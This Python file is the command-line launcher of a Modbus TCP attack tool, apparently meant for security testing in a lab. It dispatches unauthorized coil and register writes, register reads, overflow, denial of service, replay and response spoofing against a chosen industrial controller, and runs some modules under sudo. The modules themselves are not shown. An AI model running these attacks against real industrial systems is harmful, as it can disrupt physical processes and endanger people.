#!/usr/bin/env python3
"""
M.A.T.R.I.X - Modbus Attack Tool for Remote Industrial eXploitation

A comprehensive tool for testing Modbus TCP security with various attack simulations.
"""

import argparse
import sys
import logging
import os
from importlib import import_module
import subprocess

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Available attack modules
AVAILABLE_ATTACKS = {
    "read": "Unauthorized read of Modbus registers and coils",
    "coil": "Unauthorized write to coils",
    "register": "Unauthorized write to holding registers",
    "overflow": "Register overflow attack",
    "dos": "Denial of Service attack",
    "replay": "Modbus traffic replay attack",
    "spoof": "Response spoofing attack"
}

def print_banner():
    """Print the tool banner"""
    banner = """
    ╔═════════════════════════════════════════════════════════╗
    ║                                                         ║
    ║     ███╗   ███╗ █████╗ ████████╗██████╗ ██╗██╗  ██╗     ║
    ║     ████╗ ████║██╔══██╗╚══██╔══╝██╔══██╗██║╚██╗██╔╝     ║
    ║     ██╔████╔██║███████║   ██║   ██████╔╝██║ ╚███╔╝      ║
    ║     ██║╚██╔╝██║██╔══██║   ██║   ██╔══██╗██║ ██╔██╗      ║
    ║     ██║ ╚═╝ ██║██║  ██║   ██║   ██║  ██║██║██╔╝ ██╗     ║
    ║     ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝     ║
    ║                                                         ║
    ║  Modbus Attack Tool for Remote Industrial eXploitation  ║
    ║                     By Karl Biron                       ║
    ╚═════════════════════════════════════════════════════════╝
    """
    print(banner)

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description='M.A.T.R.I.X - Modbus Attack Tool for Remote Industrial eXploitation')
    parser.add_argument('-H', '--host', default='localhost', help='Target Modbus server IP address (default: localhost)')
    parser.add_argument('-p', '--port', type=int, default=502, help='Target Modbus server port (default: 502)')
    parser.add_argument('-a', '--attack', choices=AVAILABLE_ATTACKS.keys(), required=True, 
                        help='Type of attack to perform')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    
    # Add attack-specific arguments
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads for DoS attack (default: 100)')
    parser.add_argument('-f', '--file', help='PCAP file for replay attack')
    parser.add_argument('-s', '--spoof-ip', default='192.168.1.50', help='IP address to spoof for response spoofing')
    parser.add_argument('-i', '--interface', default='docker0', help='Network interface for packet operations')
    parser.add_argument('--standalone', action='store_true', help='Run a standalone attack module directly')
    
    return parser.parse_args()

def execute_attack(args):
    """Execute the selected attack based on command line arguments"""
    # Handle running in standalone mode for replay and spoof attacks
    if args.standalone and (args.attack == "replay" or args.attack == "spoof"):
        # Direct execution of the standalone attack script
        script_dir = os.path.dirname(os.path.abspath(__file__))
        
        if args.attack == "replay":
            attack_module = os.path.join(script_dir, "attacks", "modbus_replay_attack.py")
            attack_args = [
                "--host", args.host,
                "--port", str(args.port)
            ]
            
            if args.file:
                attack_args.extend(["--file", args.file])
                
        elif args.attack == "spoof":
            attack_module = os.path.join(script_dir, "attacks", "modbus_spoof_response.py")
            attack_args = [
                "--host", args.host,
                "--port", str(args.port),
                "--interface", args.interface
            ]
            
            if args.spoof_ip:
                attack_args.extend(["--spoof-ip", args.spoof_ip])
        
        if not os.path.exists(attack_module):
            logger.error(f"Attack module not found: {attack_module}")
            return 1
            
        # Execute the script directly with sudo
        cmd = ["sudo", sys.executable, attack_module] + attack_args
        logger.info(f"Executing: {' '.join(cmd)}")
        return subprocess.call(cmd)
    
    try:
        # Import the appropriate attack module
        if args.attack == "read":
            from attacks.modbus_unauthorized_read import ModbusUnauthorizedReader
            attacker = ModbusUnauthorizedReader(host=args.host, port=args.port)
            attacker.run_comprehensive_scan()
            
        elif args.attack == "coil":
            from attacks.modbus_coil_write_attack import ModbusUnauthorizedCoilWriter
            attacker = ModbusUnauthorizedCoilWriter(host=args.host, port=args.port)
            attacker.run_test()
            
        elif args.attack == "register":
            from attacks.modbus_holding_registers_write_attack import ModbusUnauthorizedHoldingRegisterWriter
            attacker = ModbusUnauthorizedHoldingRegisterWriter(host=args.host, port=args.port)
            attacker.run_test()
            
        elif args.attack == "overflow":
            from attacks.modbus_overflow_attack import ModbusOverflowAttacker
            attacker = ModbusOverflowAttacker(host=args.host, port=args.port)
            attacker.run_overflow_attack()
            
        elif args.attack == "dos":
            from attacks.modbus_dos_attack import ModbusDoSAttacker
            attacker = ModbusDoSAttacker(args.host, args.port, args.threads)
            attacker.launch_attack()
            
        elif args.attack == "replay":
            from attacks.modbus_replay_attack import ModbusReplyAttacker
            attacker = ModbusReplyAttacker(target_ip=args.host, target_port=args.port)
            
            pcap_file = args.file or "ModbusTraffic.pcap"
            modbus_packets = attacker.load_modbus_packets(pcap_file)
            
            if attacker.connect_to_target():
                attacker.analyze_packets(modbus_packets)
                attacker.execute_replay(modbus_packets)
                
        elif args.attack == "spoof":
            from attacks.modbus_spoof_response import ModbusResponseSpoofer
            attacker = ModbusResponseSpoofer(
                target_ip=args.host, 
                target_port=args.port,
                spoof_ip=args.spoof_ip
            )
            attacker.interface = args.interface
            attacker.run_spoof_attack()
            
    except ImportError as e:
        logger.error(f"Failed to import attack module: {e}")
        logger.error("Make sure all dependencies are installed")
        return 1
    except Exception as e:
        logger.error(f"Attack execution failed: {e}")
        return 1
        
    return 0

def list_attacks():
    """List all available attacks with descriptions"""
    print("\nAvailable Attack Modules:")
    print("-------------------------")
    for attack, description in AVAILABLE_ATTACKS.items():
        print(f"  {attack:10} - {description}")
    print()

def main():
    """Main function"""
    print_banner()
    
    # Parse command line arguments
    args = parse_arguments()
    
    # Set log level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
        
    logger.info(f"Target: {args.host}:{args.port}")
    logger.info(f"Attack: {args.attack} ({AVAILABLE_ATTACKS[args.attack]})")
    
    # Execute the selected attack
    return execute_attack(args)

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        logger.info("\nOperation cancelled by user")
        sys.exit(0)